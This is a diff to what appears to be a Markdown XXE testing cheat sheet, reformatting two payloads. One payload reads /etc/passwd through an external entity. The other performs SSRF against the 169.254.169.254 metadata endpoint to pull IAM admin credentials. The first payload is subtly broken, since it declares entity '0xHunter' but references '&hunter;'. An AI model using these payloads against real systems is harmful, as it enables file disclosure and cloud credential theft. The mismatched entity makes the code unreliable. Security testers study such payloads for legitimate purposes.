@@ -27,12 +27,16 @@ Manually testing for XXE vulnerabilities generally involves:
 ## Normal
 ```xml
 [*] to retrieve files
-<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY 0xHunter SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&hunter;</productId></stockCheck>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY 0xHunter SYSTEM "file:///etc/passwd"> ]> 
+<stockCheck>
+	<productId>&hunter;</productId>
+</stockCheck>
 
 -----------------------------------------------------------------------------------
 
 [*] to perform SSRF
-<!DOCTYPE test [ <!ENTITY Hunter SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<!DOCTYPE test [<!ENTITY Hunter SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
 &Hunter; 
 ```
 
